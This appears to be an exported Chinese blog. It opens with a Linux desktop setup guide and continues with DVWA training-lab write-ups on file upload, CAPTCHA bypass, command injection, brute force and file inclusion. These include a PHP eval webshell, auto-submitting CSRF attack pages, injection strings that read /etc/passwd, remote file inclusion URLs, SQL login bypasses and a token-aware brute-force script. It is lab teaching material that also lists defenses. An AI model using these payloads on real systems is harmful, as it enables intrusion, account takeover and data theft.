admin:///etc/default/keyboard增加XKBOPTIONS=&quot;terminate:ctrl_alt_bksp&quot; 重启生效 FireJail沙箱安装1sudo apt install firejail 将应用程序以沙箱运行1firejail firefox 查看以沙箱运行的应用程序1firejail --tree 生产力软件基础软件包 flashplugin-installer：浏览器flash插件 meld：用于比对两个目录或文件的差异 amule：电驴下载工具 transmission、qbittorrent：BT下载工具 ttf-wqy-microhei：文泉驿微米黑字体 mtr：网络路径追踪工具 whois：IP、域名注册信息查询工具 git：github下载 curl：完成浏览器请求服务器的命令行工具 obs-studio：录屏软件，直播软件 ubuntu-restricted-extras：一组视频解码器 libavcodec-extra、libdvd-pkg：支持dvd格式播放 unrar、unrar-free：rar格式解压 woeusb：U盘刻录工具 123sudo add-apt-repository ppa:nilarimogard/webupd8sudo apt updatesudo apt install woeusb ascii：查看ASCII编码 unicode：unicode编码转换工具 axel：字符界面下载工具 flameshot：截图工具 xfce4-taskmanager：杀死卡顿的应用程序，可以快速定位应用程序窗口 Remmina：远程连接工具，可很好支持rdp连接 CopyQ：剪贴板管理器 123sudo add-apt-repository ppa:hluk/copyqsudo apt-get updatesudo apt-get install copyq 安装JAVA 下载jdk1.8版本tar包 https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html 解压tar包 1tar -zxvf jdk-8u171-linux-x64.tar.gz 移动位置 1sudo mv jdk1.8.0_171 /usr/local/jdk1.8 设置环境变量 1234export JAVA_HOME=/usr/local/jdk1.8 export JRE_HOME=$&#123;JAVA_HOME&#125;/jre export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib export PATH=.:$&#123;JAVA_HOME&#125;/bin:$PATH 环境变量生效 1source /etc/profile 查看是否安装成功 12javajavac 中文输入法 安装 1sudo apt install ibus ibus-pinyin 配置 1im-config 重启操作系统 添加输入法 修复BUG 1ibus-setup 取消embed勾选项 常用软件Chrome以deb格式安装 Golddict 安装 1sudo apt install goldendict 添加有道在线词典 1http://dict.youdao.com/search?q=%GDWORD%&amp;ue=utf8 邮件 mailspring：界面更好看 thunderbird：性能更优 Protonmail Desktop：匿名邮件，实现端到端的加密 office WPS for Linux onlyoffice to-do-list(计划列表) zenkit 通过Ubuntu官方软件安装器安装 笔记 印象笔记tusk 通过Ubuntu官方软件安装器安装 书籍管理 calibre 虚拟机 virtualbox VMWare Workstation 下载工具 uGet 支持断点续传 安装 123sudo add-apt-repository ppa:plushuang-tw/uget-stablesudo apt updatesudo apt install uget aria2 配置 图形图像视频编辑 GIMP：Linux下的PS VLC：视频播放软件 kdenlive：视频编辑 pitivi：视频编辑 思维导图 MindMaster 开发工具、编辑器 sublime text visual studio code Atom 123sudo add-apt-repository ppa:webupd8team/atomsudo apt-get updatesudo apt-get install atom appimage程序下载https://appimage.github.io/ 系统快捷键 ctrl+alt+向上/向下：快速切换Linux虚拟桌面 win+a：显示系统所有安装的软件的界面 shift/alt+printscreen：自定义截图/当前窗口截图，保存到图片目录 win+向上/向下/向左/向右：将当前窗口最大化/返回初始大小及位置/屏幕一半靠左/屏幕一半靠右 ctrl+alt+t：打开终端窗口 ctrl+shift+n：在原有终端窗口基础上新建终端窗口或在桌面新建文件夹 ctrl+d：关闭终端窗口 ctrl+shift+t：在终端窗口中新建标签页 ctrl+shift+c/v：在终端窗口中复制/粘贴 win+d：显示桌面 ctrl+w/q：关闭一个/关闭所有标签页(适用于部分应用程序) win+l：锁定当前登陆会话(锁屏) win+m：打开或关闭日历 win+h：将当前窗口最小化 alt+win+8：放大/恢复桌面 win+shift+pageup/pagedown：将当前应用程序窗口上移/下移至其他虚拟桌面 Ubuntu安装微信、QQ等依靠Deepin开发移植，使得Linux操作系统可以安装Windows软件 安装微信 安装deepin-wine环境 访问https://github.com/wszqkzqk/deepin-wine-ubuntu 下载zip包 建议git下载 1git clone https://gitee.com/wszqkzqk/deepin-wine-for-ubuntu.git 解压到本地文件夹，在文件夹中打开终端，执行 1sudo sh ./install.sh 安装相关容器 访问http://mirrors.aliyun.com/deepin/pool/non-free/d/ 下载想要的容器，以deb安装即可 推荐容器 TIM：http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.qq.office/ QQ：http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.qq.im/ QQ轻聊版：http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.qq.im.light/ 微信：http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.wechat/ 相关问题 Ubuntu桌面无法显示托盘图标 安装TopIconPlus的gnome-shell扩展 1sudo apt-get install gnome-shell-extension-top-icons-plus 用Alt+F2–&gt;r命令重启gnome-shell 最后用gnome-tweaks开启这个扩展 微信无法发送图片 1sudo apt install libjpeg62:i386 Ubuntu系发行版不卸载包 deepin-wine环境使用zip包中的uninstall.sh脚本卸载 deepin-wine的应用容器，用sudo apt remove 软件包主名命令来卸载 配置Shadowsocks采用shadowsocks-qt5(GUI)+Chrome/Firefox+SwitchOmega的方式配置shadowsocks的科学上网模式 添加shadowsocks-qt5(GUI)仓库 1sudo add-apt-repository ppa:hzwhuang/ss-qt5 报错 1仓库 “http://ppa.launchpad.net/hzwhuang/ss-qt5/ubuntu bionic Release” 没有Release 文件 解决方案 1修改/etc/apt/sources.list.d/hzwhuang-ubuntu-ss-qt5-bionic.list文件，将bionic（18.04版本代号）改为xenial（16.04版本代号） 安装shadowsocks-qt5(GUI) 12sudo apt-get updatesudo apt-get install shadowsocks-qt5 开启shadowsocks-qt5(GUI)，配置代理，后设置浏览器代理即可 使用Clonezilla进行系统备份Ubuntu自带Disks工具可以对系统分区或硬盘进行备份，但不支持备份压缩 Clonezilla: 源自台湾政府安全部门的开源项目 备份中可实现镜像压缩 支持网络及外置存储设备 支持服务器/客户端部署，支持PXE，即网路同传方式 以ISO引导的方式进行系统备份 官方地址：https://clonezilla.org/ 下载登录官方网站，选择最新稳定版Clonezilla 根据要备份的系统版本选择Clonezilla版本，下载iso版 备份当计算机只有一个硬盘时，可以对硬盘进行分区，将系统分区进行备份，将备份文件存储到其他分区中 当计算机使用多块硬盘时，建议将操作系统所在的硬盘进行整体备份，将备份文件存储到其他硬盘中，更加有利于系统的恢复 以下操作在虚拟机环境下进行，对系统所在硬盘进行整体备份，存储到虚拟机的另一块硬盘中 对新分配的硬盘进行分区等操作，使其能够进行存储 挂载Clonezilla的引导盘 设置虚拟机“启动时连接”，设置BIOS以光盘启动，启动虚拟机则会进入Clonezilla启动界面 选择第一项Clonezilla live，以光盘方式引导Clonezilla，或者选择第四项Other modes of Clonezilla live，以其他分辨率来启动Clonezilla，最高支持1024*768 选择操作的语言环境 选择键盘类型，默认美式键盘即可 选择启动Clonezilla或者进入shell命令行，选择第一项启动Clonezilla 选择需要进行的操作，选择第一项device-image 第一项device-image：将硬盘或者分区备份为镜像文件 第二项device-device：将一个硬盘的所有内容复制到另一个硬盘中，包括引导、分区等 第三项至第六项为通过网络进行操作的选项 选择备份完成的镜像文件的存储方式，因现在为将第一块硬盘备份为镜像文件存储到第二块硬盘上，则选择第一项local_dev Clonezilla支持通过各种方式将备份完成的镜像文件传输到其他位置，利于存储 Clonezilla会提示插入存储设备，按回车，Clonezilla会自动检测存储设备 此时，Clonezilla检测到计算机上的存储设备并列出，可以查看Clonezilla是否将存储设备全部列出 确定Clonezilla将全部存储设备列出后，按Ctrl+c,选择存放备份完成的镜像文件的存储设备，现在即名称为sdb1的第二块硬盘 Clonezilla会列出所选择的存储设备上的文件目录，可以选择某个目录来存储备份完成的镜像文件，默认选择的为存储设备的根目录\，使用Tab选择Done，确定选择 Clonezilla会列出存储设备的挂载状态，按回车即可 选择高级参数设置向导方式，建议选择第一项Beginner初学模式 选择备份、还原方式，备份硬盘或者备份分区，还原硬盘或者还原分区，现在选择第一项savedisk备份硬盘 设置备份完成的镜像文件的名称，默认以系统的日期进行命名，根据需要进行修改 选择要备份的硬盘，即第一块硬盘，即操作系统所在的硬盘 在系统备份之前，Clonezilla提示是否要对文件系统进行检查，可以根据实际情况进行选择 -sfsck：跳过检查 -fsck：进行检查 -fsck -y：进行检查，并在检查过程中进行自动修复 Clonezilla提示在备份完成之后，是否要对备份完成的镜像文件进行检查，以保证镜像文件可以用于后续的恢复工作，可以根据实际情况进行选择 设置是否对备份完成的镜像文件进行密码设置，设置后在使用镜像文件恢复时需要输入密码，可以根据实际情况进行选择 设置当备份完成后，需要对计算机进行什么操作：选择、重启、关机 Clonezilla会将前面所有操作生成一条命令可供后续再次使用，按回车继续 Clonezilla会再次提示是否确认将第一块硬盘sda备份为镜像文件，此时sda中只有sda1一个分区，输入y确定 备份开始 备份完成后，按回车键即可执行前面第22步选择的操作：选择、重启、关机 即可以看到生成的镜像文件 还原恢复 同样，使用Clonezilla光盘进行引导启动 重复备份时第4至12步的操作过程后，进入到Clonezilla列出镜像文件的存储设备上的文件目录界面，选择备份完成的img镜像文件，使用Tab键选择Done 之后同样使用初学模式，进入选择备份硬盘或分区以及还原硬盘或分区界面，选择第三项restoredisk还原镜像文件到本机硬盘 确认用于恢复的镜像文件的名称 选择需要使用镜像文件恢复的硬盘 Clonezilla提示是否在恢复前对镜像文件进行完整性检查，可以根据需要进行选择 选择在恢复完成后，计算机进行的操作：选择、重启、关机 同样，Clonezilla将所有操作生成一条命令用于后续再次使用，按回车键继续。之后，Clonezilla两次提示是否确认将进行镜像文件还原到sda硬盘的操作，输入y确认 还原恢复开始 等待完成即可，同样，恢复完成后，按回车键即可执行前面第7步选择的操作：选择、重启、关机 参考链接https://www.lulinux.com/archives/1319 https://github.com/wszqkzqk/deepin-wine-ubuntu https://www.imzzj.com/post-549.html]]></content>
      <categories>
        <category>Linux桌面优化与美化</category>
      </categories>
      <tags>
        <tag>Linux桌面</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA1.10之文件上传]]></title>
    <url>%2F2019%2F05%2F27%2FDVWA1-10%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2F</url>
    <content type="text"><![CDATA[文件上传漏洞文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞 文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知 LOW级别漏洞利用 编辑一句话木马1.php 123&lt;?php @eval($_POST[&apos;cmd&apos;]);?&gt; 上传 中国菜刀链接webshell 指定连接目录为http://172.16.12.89/hackable/uploads/1.php，参数为cmd，类型为PHP(eval) 双击新添加的条目 获取目标站点目录访问权限 模拟终端 Medium级别Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型(Content-Type)必须是jpeg或者png，大小不能超过100000B（约为97.6KB） 抓包修改文件类型一句话木马不受大小限制影响 将1.php更名为a.png 上传a.png，抓包 修改上传文件后缀名 上传成功 中国菜刀连接 指定连接目录为http://172.16.12.89/hackable/uploads/a.php，参数为cmd，类型为PHP(eval) High级别High级别的代码读取文件名中最后一个.后的字符串(文件后缀名)，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是*.jpg、*.jpeg 、*.png之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型 什么是文件头文件头是位于文件开头的一段承担一定任务的数据，一般都在开头的部分 文件头就是为了描述一个文件的一些重要的属性,文件头告诉了打开并处理该文件的程序这些属性 常见文件的文件头(16进制)： JPEG (jpg)，文件头：FFD8FF PNG (png)，文件头：89504E47 GIF (gif)，文件头：47494638 HTML (html)，文件头：68746D6C3E MS Word/Excel (xls.or.doc)，文件头：D0CF11E0 Quicken (qdf)，文件头：AC9EBD8F ZIP Archive (zip)，文件头：504B0304 RAR Archive (rar)，文件头：52617221 可执行文件（EXE），文件头：MZ 将木马隐藏在图片中绕过(文件上传+文件包含) 使用copy将木马文件a.php与图片文件1.jpg合并 1copy 1.jpg/b+a.php/a a.jpg 可以看到，一句话木马被添加到图片的尾部 上传成功 利用high级别文件包含漏洞读取图片马 中国菜刀连接 1http://172.16.12.83/vulnerabilities/fi/?page=file:///opt/lampp/htdocs/DVWA-master/hackable/uploads/a.jpg 注意，应设置请求头中包含cookie值 连接成功 Impossible级别Impossible级别的代码对上传文件进行了重命名（改为md5值），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件 文件上传防御 文件扩展名在服务器端使用白名单进行校验 文件内容在服务器端进行校验 对文件进行上传重命名 隐藏文件上传路径 文件上传目录权限为任何人不可执行]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>DVWA1.10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA1.10之不安全的验证码]]></title>
    <url>%2F2019%2F05%2F23%2FDVWA1-10%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%2F</url>
    <content type="text"><![CDATA[简介Insecure CAPTCHA，意思是不安全的验证码，CAPTCHA是“全自动区分计算机和人类的图灵测试”的简称 reCaptcha是Google开发的验证码工具，是Google提供的使用最广泛的验证码服务，是一项免费服务，可以保护您的网站免受垃圾邮件和滥用。reCAPTCHA使用先进的风险分析引擎和自适应CAPTCHA来防止自动化软件在您的网站上进行滥用行为 reCAPTCHA验证流程 网站服务器调用recaptcha_check_answer函数检查用户输入验证码的正确性 1recaptcha_check_answer($privkey,$response) $privkey是服务器申请的private key(私钥) $response：通过页面表单发送的g-recaptcha-response的值 recaptcha_check_answer函数返回ReCaptchaResponse class的实例，ReCaptchaResponse类有2个属性： $is_valid是布尔型的，表示校验是否有效 $error是返回的错误代码 那这个模块的实验是不是需要科学上网呢？答案是不用，因为我们可以绕过验证码 LOW级别服务器将改密操作分成了两步： 检查用户输入的验证码，验证通过后，服务器返回表单 客户端提交post请求，服务器完成更改密码的操作 这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step参数来判断用户是否已经输入了正确的验证码 因未科学上网，验证码无法显示 修改参数绕过 抓包修改step参数 因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有recaptcha_challenge_field、recaptcha_response_field两个参数 将step参数由1修改为2 密码修改成功 构造攻击页面由于没有任何的防御CSRF机制，我们可以轻易地构造攻击页面 编写攻击页面xx.html 1234567891011121314151617181920212223&lt;html&gt; &lt;body onload=&quot;document.getElementById(&apos;transfer&apos;).submit()&quot;&gt; &lt;div&gt; &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://172.16.12.93/vulnerabilities/captcha/&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password123&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password123&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 将攻击页面放置到攻击者的公网服务器(此处为192.168.43.132)上 向被攻击者发送恶意链接 1http://192.168.43.132/xx.html 被攻击者在登陆DVWA的情况下点击恶意链接，则密码被修改成功 美中不足的是，被攻击者看到更改密码成功的界面（这是因为修改密码成功后，服务器会返回302，实现自动跳转），从而意识到自己遭到了攻击 Medium级别Medium级别的代码在第二步验证时，参加了对参数passed_captcha的检查，如果参数值为true，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证 修改参数绕过 抓包修改step参数，增加passed_captcha参数，绕过验证码 密码修改成功 构造攻击页面依然可以进行CSRF攻击 编写攻击页面cc.html 12345678910111213141516171819202122232425&lt;html&gt; &lt;body onload=&quot;document.getElementById(&apos;transfer&apos;).submit()&quot;&gt; &lt;div&gt; &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://172.16.12.93/vulnerabilities/captcha/&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password123&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password123&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;passed_captcha&quot; value=&quot;true&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 将攻击页面放置到攻击者的公网服务器(此处为192.168.43.132)上 向被攻击者发送恶意链接 1http://192.168.43.132/cc.html 被攻击者在登陆DVWA的情况下点击恶意链接，则密码被修改成功 不过依然会跳转到更改密码成功的界面 High级别服务器的验证逻辑是当$resp（这里是指谷歌返回的验证结果）是true，或者参数g-recaptcha-response等于hidd3n_valu3并且http包头的User-Agent参数等于reCAPTCHA时，就认为验证码正确 $resp参数不可控 抓包修改参数 修改User-Agent值为reCAPTCHA 添加g-recaptcha-response参数，值为hidd3n_valu3 密码修改成功 Impossible级别Impossible级别的代码增加了Anti-CSRF token 机制防御CSRF攻击，利用PDO技术防护sql注入，验证过程终于不再分成两部分了，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了身份认证]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>DVWA1.10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[低版本DVWA靶机]]></title>
    <url>%2F2019%2F05%2F22%2F%E4%BD%8E%E7%89%88%E6%9C%ACDVWA%E9%9D%B6%E6%9C%BA-1%2F</url>
    <content type="text"><![CDATA[因高版本xampp中php版本过高，部分dvwa靶机环境无法使用，所以重新部署DVWA环境 环境centos7 32位 xampp版本1.7.3 DVWA版本1.10 xampp部署 解压 1tar xzvf xampp-linux-1.7.3.tar.gz -C /opt 启动xampp 12cd /opt/lampp./lampp start 禁用xampp的ssl功能 12cd /opt/lampp./lampp stopssl 配置xampp的安全选项 1./lampp security 重启xampp 1./lampp restart 开放防火墙80端口 12firewall-cmd --zone=public --add-port=80/tcp --permanentfirewall-cmd --reload 访问即可 DVWA部署 解压 1unzip DVWA-master.zip -d /opt/lampp/htdocs/ 更名 12cd /opt/lampp/htdocsmv DVWA-master/ dvwa/ 更改网站根目录 1vi /opt/lampp/etc/httpd.conf 将DocumentRoot &quot;/opt/lampp/htdocs&quot;更改为DocumentRoot &quot;/opt/lampp/htdocs/dvwa&quot; 设置dvwa配置文件 12cd /opt/lampp/htdocs/DVWA-master/configcp config.inc.php.dist config.inc.php 重启lampp服务即可访问 DVWA配置 PHP function allow_url_include: Disabled 1vi /opt/lampp/etc/php.ini 将allow_url_include=Off改为allow_url_include=On reCAPTCHA key: Missing 1vi /opt/lampp/htdocs/dvwa/config/config.inc.php 将 12$_DVWA[ &apos;recaptcha_public_key&apos; ] = &apos;&apos;;$_DVWA[ &apos;recaptcha_private_key&apos; ] = &apos;&apos;; 改为： 12$_DVWA[ &apos;recaptcha_public_key&apos; ] = &apos;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&apos;;$_DVWA[ &apos;recaptcha_private_key&apos; ] = &apos;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&apos;; Unable to connect to the database. 1vi /opt/lampp/htdocs/dvwa/config/config.inc.php 将$_DVWA[ &#39;db_password&#39; ] = &#39;&#39;;中的值改为自己mysql的root用户的密码 对目录无可写权限 123chmod 757 /opt/lampp/htdocs/dvwa/hackable/uploads/chmod 646 /opt/lampp/htdocs/dvwa/external/phpids/0.6/lib/IDS/tmp/phpids_log.txtchmod 757 /opt/lampp/htdocs/dvwa/config 重启服务 12cd /opt/lampp/./lampp restart 刷新页面即可 点击Create/Reset Database即可登陆使用 添加开机自启 创建启动文件 12cd /lib/systemd/system/vi /lib/systemd/system/lampp.service 文件内容如下： 12345678910111213[Unit] Description=lamppAfter=network.target [Service]Type=forkingExecStart=/opt/lampp/lampp startExecReload=/opt/lampp/lampp restartExecStop=/opt/lampp/lampp stop PrivateTmp=true [Install]WantedBy=multi-user.target 设置启动文件权限 1chmod 754 /lib/systemd/system/lampp.service 设置开机自启 1systemctl enable lampp.service]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>DVWA1.10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA1.10之命令注入]]></title>
    <url>%2F2019%2F05%2F22%2FDVWA1-10%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[命令注入简介命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的 LOW级别服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞 正常执行 使用&amp;同时执行多条命令 1127.0.0.1 &amp; pwd 使用|(管道符)同时执行多条命令 1127.0.0.1 | cat /etc/passwd 使用&amp;&amp;(与)同样可以执行多条命令 1127.0.0.1 &amp;&amp; pwd 使用||(或)同样可以执行多条命令 11 || cat /etc/passwd 使用;同样可以执行多条命令 1127.0.0.1 ; pwd 使用`、$()在有些情况下也可执行多条指令 &amp;与&amp;&amp;的区别： Command 1&amp;Command 2 先执行Command 1，不管是否成功，都会执行Command 2 Command 1&amp;&amp;Command 2 先执行Command 1，执行成功后执行Command 2，否则不执行Command 2 |与||的区别： Command 1|Command 2 管道符，Command 2会以Command 1的输出结果为输入进行执行 Command 1||Command 2 先执行Command 1失败，才会执行Command 2 Medium级别服务器端对ip参数做了一定过滤，即把&amp;&amp; 、;删除，本质上采用的是黑名单机制，因此依旧存在安全问题 使用&amp;绕过过滤 1127.0.0.1 &amp; cat /etc/passwd 使用&amp;;&amp;绕过过滤 1127.0.0.1 &amp;;&amp; pwd High级别High级别的代码进一步完善了黑名单，过滤了&amp;、;、|、-、$、(、)、||、` 但由于黑名单机制的局限性，我们依然可以绕过 黑名单看似过滤了所有的非法字符，但仔细观察到是把|（注意这里|后有一个空格）替换为空字符，于是 |（注意这里|前有一个空格）成了“漏网之鱼” 1127.0.0.1 |cat /etc/passwd Impossible级别Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞 命令注入防御 如特殊需要，尽量不要使用系统命令 对敏感字符进行白名单过滤 参数值使用引号包括]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>DVWA1.10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA1.10之暴力破解]]></title>
    <url>%2F2019%2F05%2F22%2FDVWA1-10%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[暴力破解简介暴力破解，是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一 LOW级别使用BurpSuite进行暴力破解 抓包 将数据包发送到Intruder 点击Clear清除需要爆破的字段，选中password的值，然后点击Add，将其指定为需爆破的字段 选择字典 开始破解 点击右上角Start attack 判断破解出的密码 当使用password进行破解时，响应包的长度与众不同，即可通过这种方式确定password为正确的密码 通过手工SQL注入进行无密码登陆 永真式注入 Username ：admin&#39; or &#39;1&#39;=&#39;1 Password ：（空） 终止式注入 Username ：admin&#39; # Password ：（空） Medium级别Medium级别的代码主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号\x00、\n、\r、\、&#39;、&quot;、\x1a）进行转义，基本上能够抵御SQL注入攻击 虽然SQL注入不再有效，但依然可以使用Burpsuite进行爆破，与Low级别的爆破方法基本一样 High级别High级别的代码加入了Token，可以抵御CSRF攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：username、password、Login以及user_token 每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行SQL查询 High级别的代码中，使用了stripslashes（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、mysql_real_escape_string函数对参数username、password进行过滤、转义，进一步抵御SQL注入 破解流程 首先请求http://172.16.12.93/vulnerabilities/brute/，获取当前的user_token 使用获取的user_token，以及字典中的密码进行暴力破解 编写脚本进行暴力破解编写Python2版本脚本xx.py，用于对password参数进行爆破 12345678910111213141516171819202122232425262728293031from bs4 import BeautifulSoupimport urllib2header=&#123;&apos;Host&apos;: &apos;172.16.12.93&apos;, &apos;Cache-Control&apos;: &apos;max-age=0&apos;, &apos;If-None-Match&apos;: &quot;307-52156c6a290c0&quot;, &apos;If-Modified-Since&apos;: &apos;Mon, 05 Oct 2015 07:51:07 GMT&apos;, &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36&apos;, &apos;Accept&apos;: &apos;*/*&apos;, &apos;Referer&apos;: &apos;http://172.16.12.93/vulnerabilities/brute/index.php&apos;, &apos;Accept-Encoding&apos;: &apos;gzip, deflate, sdch&apos;, &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8&apos;, &apos;Cookie&apos;: &apos;PHPSESSID=1c576ae10332a03dd5c373c9469949e1; security=high&apos;&#125;requrl = &quot;http://172.16.12.93/vulnerabilities/brute/&quot;def get_token(requrl,header): req = urllib2.Request(url=requrl,headers=header) response = urllib2.urlopen(req) print response.getcode(), the_page = response.read() print len(the_page) soup = BeautifulSoup(the_page,&quot;html.parser&quot;) user_token = soup.select(&apos;input[type=&quot;hidden&quot;]&apos;)[0].get(&apos;value&apos;) #get the user_token return user_tokenuser_token = get_token(requrl,header)i=0for line in open(&quot;wordlist.txt&quot;): requrl = &quot;http://172.16.12.93/vulnerabilities/brute/&quot;+&quot;?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token i = i+1 print i,&apos;admin&apos;,line.strip(), user_token = get_token(requrl,header) 使用BurpSuite进行暴力破解 首先，进行抓包 将其发送到Intruder模块 将password字段、user_token字段设置为要破解的字段 设置攻击模式为Pitchfork 将HTTP请求的线程数设置为1 设置Grep-Extract处，选择Add 设置需要从响应中获取的信息 点击获取响应 选择user_token的值，并复制 点击OK 设置payloads 第一个字典类型选择简单的列表，选择密码字典 第二个字典类型选择递归grep，填写第一次请求所使用的payload，即上一步复制的user_token的值 设置完成后，开始攻击 通过一段时间的暴力破解，即可破解出密码 Impossible级别Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续 采用了更为安全的PDO（PHP Data Object）机制防御SQL注入 暴力破解防御 使用高强度的密码(至少8位，数字、大写字母、小写字母、特殊符号) 设置登陆失败限制次数 设置密码历史，强制密码修改期限等密码策略 安装python第三方软件包bs4在线安装 进入python安装目录下的Script目录 安装 1pip install beautifulsoup4 离线安装 bs4官网下载tar.gz包 将压缩包解压至python安装目录下,进入解压文件后输入指令 1python setup.py install]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>DVWA1.10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA1.10之文件包含]]></title>
    <url>%2F2019%2F05%2F20%2FDVWA1-10%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%2F</url>
    <content type="text"><![CDATA[文件包含漏洞文件包含漏洞，是指当服务器开启allow_url_include选项和allow_url_fopen选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取 文件包含漏洞分为本地文件包含漏洞(LFI)与远程文件包含漏洞(RFI)，远程文件包含漏洞是因为开启了php配置中的allow_url_include选项（选项开启之后，服务器允许包含一个远程的文件） LOW级别点击页面中的连接，会对相应的文件进行包含 本地文件包含构造绝对路径URL 1http://172.16.12.93/vulnerabilities/fi/?page=/etc/passwd 构造相对路径URL 1http://172.16.12.93/vulnerabilities/fi/?page=../../../../../../etc/passwd 远程文件包含远端服务器主页： 构造URL 1http://172.16.12.93/vulnerabilities/fi/?page=http://192.168.1.3/ Medium级别Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将http://、https://、../、..\替换为空字符，即删除 本地文件包含可以以绝对路径来绕过../、..\过滤 1http://172.16.12.93/vulnerabilities/fi/?page=/etc/passwd 远程文件包含以双写绕过http://、https://过滤 1http://172.16.12.93/vulnerabilities/fi/?page=hthttp://tp://192.168.1.3/ High级别High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file开头的文件 可以利用file协议绕过防护策略 当用浏览器打开一个本地文件时，使用的就是file协议 构造URL 1http://172.16.12.93/vulnerabilities/fi/?page=file:///etc/passwd Impossible级别Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为include.php、file1.php”、“file2.php、file3.php之一，彻底杜绝了文件包含漏洞 文件包含防御 PHP中使用open_basedir配置，将访问限制在指定区域 过滤../、..\等等特殊字符 禁止服务器远程文件包含(allow_url_include设置为Off) 白名单限制可包含的文件]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>DVWA1.10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA1.10之CSRF]]></title>
    <url>%2F2019%2F05%2F20%2FDVWA1-10%E4%B9%8BCSRF%2F</url>
